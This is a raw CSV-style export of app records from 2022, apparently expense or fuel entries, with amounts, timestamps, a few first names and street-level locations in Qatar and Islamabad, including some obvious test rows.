259,19.24,"0.00",,,,2022-04-27 06:23:03+00,"",2022-04-27 06:23:14.335937+00,2022-04-27 06:23:14.335948+00,362,1,2017,1,123,1,1
260,18.45,"0.00",,,,2022-04-27 17:52:57+00,"",2022-04-27 17:53:17.388769+00,2022-04-27 17:53:17.388779+00,362,1,2017,1,123,1,1
261,"58.30","0.00",,,,2022-04-28 03:06:11+00,"",2022-04-28 03:06:31.123949+00,2022-04-28 03:06:31.123959+00,362,1,2017,1,123,1,1
262,15.82,"0.00",,"Al Rayyan, Qatar",,2022-04-28 03:44:21+00,"",2022-04-28 03:44:55.824369+00,2022-04-28 03:44:55.824379+00,362,1,2017,1,123,1,1
263,15.52,"0.00",,"Bu Samra Street, Al Rayyan, 40466, Qatar",,2022-04-28 04:15:32+00,"",2022-04-28 04:15:59.449412+00,2022-04-28 04:15:59.449423+00,362,1,2017,1,123,1,1
264,"16.30","0.00",,,,2022-04-29 12:07:00+00,"",2022-04-29 12:07:21.540585+00,2022-04-29 12:07:21.540596+00,362,1,2017,1,123,1,1
265,57.81,"0.00",,,,2022-04-30 02:55:06+00,"",2022-04-30 02:55:34.095457+00,2022-04-30 02:55:34.095473+00,362,1,2017,1,123,1,1
266,58.11,"0.00",,,,2022-05-02 03:30:12+00,"",2022-05-02 03:30:40.798229+00,2022-05-02 03:30:40.798242+00,362,1,2017,1,123,1,1
267,20.03,"0.00",,"Qatar Distribution Company (QDC);QDC, Leawaina Street, Al Rayyan, 23149, Qatar",,2022-05-02 04:53:45+00,"",2022-05-02 04:54:13.644275+00,2022-05-02 04:54:13.644286+00,362,1,2017,1,123,1,1
268,19.34,"0.00",,,,2022-05-02 16:04:19+00,"",2022-05-02 16:04:22.304746+00,2022-05-02 16:04:22.304757+00,362,1,2017,1,123,1,1
248,"32.00","0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-04-26 21:56:59.78387+00,"",2022-04-26 21:57:31.576737+00,2022-04-26 21:57:31.576755+00,656,1,2017,1,146,"0",1
269,16.21,"0.00",,,,2022-05-03 15:29:49+00,"",2022-05-03 15:30:12.284994+00,2022-05-03 15:30:12.285005+00,362,1,2017,1,123,1,1
270,66.21,"0.00",,,,2022-05-04 15:41:39+00,"",2022-05-04 15:42:01.830588+00,2022-05-04 15:42:01.830604+00,362,1,2017,1,123,1,1
271,"50.10","0.00",,,,2022-05-07 03:04:20+00,"",2022-05-07 03:04:49.736555+00,2022-05-07 03:04:49.736571+00,362,1,2017,1,123,1,1
272,20.51,"0.00",,"Dukhan Road, Al Rayyan, Qatar",,2022-05-07 04:06:35+00,"",2022-05-07 04:07:00.318078+00,2022-05-07 04:07:00.318089+00,362,1,2017,1,123,1,1
273,"30.00","0.00",,"University Street, Hazm Al Markhiya, Doha, ZONE 65, Qatar",,2022-05-08 09:26:07+00,"",2022-05-08 09:26:44.411621+00,2022-05-08 09:26:44.411632+00,415,1,2017,1,9,1,1
312,"21.00","0.00",,"Street 180, Costa Malaz, Doha, Qatar",,2022-09-08 13:50:18+00,"",2022-09-08 13:50:21.54979+00,2022-09-08 13:50:21.549801+00,415,1,2017,1,9,1,1
313,"23.50","0.00",,"Srinagar Highway, G-10, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-09-22 16:43:19.574772+00,"",2022-09-22 16:45:47.896+00,2022-09-22 16:45:47.896016+00,678,1,2017,1,9,1,1
314,"20.00","5000.00",testppvt,sirinagar highway,testppvt,2022-09-23 08:28:30+00,"",2022-09-23 08:29:34.208281+00,2022-09-23 08:29:56.604446+00,415,1,2017,1,9,"0",
315,"46.00","0.00",,"Street 180, Costa Malaz, Doha, Qatar",,2022-09-25 09:31:14+00,"",2022-09-25 09:31:17.069706+00,2022-09-25 09:31:17.069716+00,415,1,2017,1,9,1,1
316,"10.00","10.00",tariq,"Unnamed Road, Doha, Qatar",cuz,2022-10-02 12:39:04+00,avatars/726.jpeg,2022-10-02 12:40:05.450288+00,2022-10-02 12:40:05.450324+00,726,1,2017,1,146,1,
249,"80.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:27:04.733215+00,"",2022-04-26 22:27:31.586392+00,2022-04-26 22:27:31.586409+00,656,1,2017,1,146,"0",1
250,"78.00","0.00",,"Saddar Road, G-6, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:28:11.048165+00,"",2022-04-26 22:28:32.119042+00,2022-04-26 22:28:32.119053+00,656,1,2017,1,146,"0",1
251,"78.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:29:18.184199+00,"",2022-04-26 22:29:34.159908+00,2022-04-26 22:29:34.159919+00,656,1,2017,1,146,"0",1
252,"78.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:30:26.2352+00,"",2022-04-26 22:30:34.451659+00,2022-04-26 22:30:34.451675+00,656,1,2017,1,146,"0",1
253,"42.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:37:26.501499+00,"",2022-04-26 22:37:36.432711+00,2022-04-26 22:37:36.432724+00,656,1,2017,1,146,"0",1
254,"78.00","0.00",,"Islamabad College For Boys, Street 8, G-6/3, G-6, Islamabad, Islamabad Capital Territory, 4400, Pakistan",,2022-04-26 22:38:14.168187+00,"",2022-04-26 22:38:32.242034+00,2022-04-26 22:38:32.242045+00,656,1,2017,1,146,"0",1
255,"78.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:39:20.780988+00,"",2022-04-26 22:39:33.257311+00,2022-04-26 22:39:33.257322+00,656,1,2017,1,146,"0",1
256,"190.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:43:55.585255+00,"",2022-04-26 22:44:04.262712+00,2022-04-26 22:44:04.262723+00,656,1,2017,1,146,"0",1
257,"162.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:54:51.24996+00,"",2022-04-26 22:55:03.062093+00,2022-04-26 22:55:03.062104+00,656,1,2017,1,146,"0",1
317,"123.00","20.00",Awais,ISL,Awais,2022-11-06 06:28:37+00,"",2022-11-13 06:28:39.192005+00,2022-11-13 06:28:39.192016+00,823,1,2017,1,3682,1,
318,"123344.00","23.00",A,ISl,B,2022-11-09 06:29:01+00,"",2022-11-13 06:29:02.457196+00,2022-11-13 06:29:02.457213+00,822,1,2017,1,3682,1,
319,"100.00","100.00",Abdul,Shell,Mubashir,2022-11-13 07:24:01+00,"",2022-11-13 07:24:50.41549+00,2022-11-13 07:24:50.415499+00,824,1,2017,1,3685,1,
320,"100.00","100.00",ALiya,Askari,Mubashir,2022-11-13 07:24:01+00,"",2022-11-13 07:25:35.760624+00,2022-11-13 07:25:35.760635+00,825,1,2020,1,3685,1,
321,"100.00","100.00",karam,Shell PSO,Mubashir,2022-11-13 07:24:01+00,"",2022-11-13 07:26:11.478807+00,2022-11-13 07:26:11.478818+00,824,1,2019,1,3685,1,
322,"100.00","100.00",Raza,Loc,Mub,2022-11-17 10:00:51+00,"",2022-11-17 10:01:13.104066+00,2022-11-17 10:01:13.104116+00,852,1,2017,1,3755,1,
